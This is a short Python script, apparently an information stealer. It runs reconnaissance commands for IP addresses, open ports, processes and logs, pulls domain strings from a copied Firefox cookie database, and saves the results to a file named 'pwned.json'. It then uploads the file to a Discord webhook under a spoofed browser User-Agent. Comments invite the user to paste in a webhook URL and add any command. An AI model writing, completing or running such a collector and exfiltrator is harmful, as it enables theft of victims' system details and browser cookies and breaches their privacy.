import json
import subprocess
import requests

commands = {
    "ip_addresses": "hostname -I",
    "kernel": "uname -r",
    "uptime": "uptime -p",
    "disk_usage": "df -h / | awk 'NR==2 {print $5}'",
    "network_interfaces": "ip addr show",
    "open_ports": "ss -tuln",
    "running_processes": "ps aux | head -n 25",
    "recent_logs": "journalctl -n 15 --no-pager",
    "Cookies:": "strings /tmp/ff_cookies.sqlite | grep -E '^[a-zA-Z0-9_.-]+\.[a-zA-Z]{2,}'"
}
#these are all the commands that get run and stored as json 
# you can add or edit anything 
# to add just add it like this 
# "______" this is your json then colon : "command" it stores and u can run whatever if it doesnt work just keep trouble shooting

report_data = {}

for key, cmd in commands.items():
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            check=True,
            timeout=10, 
        )
# this just checks if everything ran within 10 seconds

        lines = result.stdout.strip().splitlines()
#white space remover


        if len(lines) == 1:
            report_data[key] = lines[0]
        elif len(lines) > 1:
            report_data[key] = lines
        else:
            report_data[key] = ""

    except subprocess.TimeoutExpired:
        report_data[key] = "Error: Command timed out after 10 seconds."
    except subprocess.CalledProcessError as e:
        report_data[key] = f"Error: {e.stderr.strip()}"
#err catcher 

json_filename = "pwned.json"
with open(json_filename, "w", encoding="utf-8") as f:
    json.dump(report_data, f, indent=4)
#json file creater

print(f"compiled the file {json_filename}")

webhook_url = (
    ""
)
# enter discord webhook url here
headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0" 
    )
}
#header 
payload = {"content": "delivered"}

try:
    with open(json_filename, "rb") as f:
        files = {"file": (json_filename, f, "application/json")}

        response = requests.post(
            webhook_url,
            data={"payload_json": json.dumps(payload)},
            files=files,
            headers=headers,
            timeout=15,
        )
#writing all the data gathered

    if response.status_code in [200, 204]:
        print("Report sent successfully!")
    else:
        print(f"Failed to send. Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")

except Exception as e:
        print(f"err: {e}")
